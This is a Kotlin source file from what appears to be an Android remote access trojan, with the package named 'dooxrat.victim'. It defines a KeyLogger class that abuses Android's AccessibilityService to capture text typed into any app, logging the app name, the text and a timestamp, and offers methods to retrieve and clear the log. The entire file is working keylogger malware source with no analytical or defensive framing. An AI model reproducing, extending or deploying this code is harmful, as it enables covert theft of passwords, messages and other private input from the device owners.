package com.dooxrat.victim

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import org.json.JSONArray
import org.json.JSONObject

class KeyLogger : AccessibilityService() {

    private val keystrokes = mutableListOf<String>()

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val text = event.text.toString()
                val packageName = event.packageName?.toString() ?: "unknown"
                
                keystrokes.add(JSONObject().apply {
                    put("app", packageName)
                    put("text", text)
                    put("time", System.currentTimeMillis())
                }.toString())
            }
        }
    }

    override fun onInterrupt() {}

    fun getKeystrokes(): JSONArray {
        val result = JSONArray()
        keystrokes.forEach { result.put(JSONObject(it)) }
        return result
    }

    fun clearKeystrokes() {
        keystrokes.clear()
    }
}
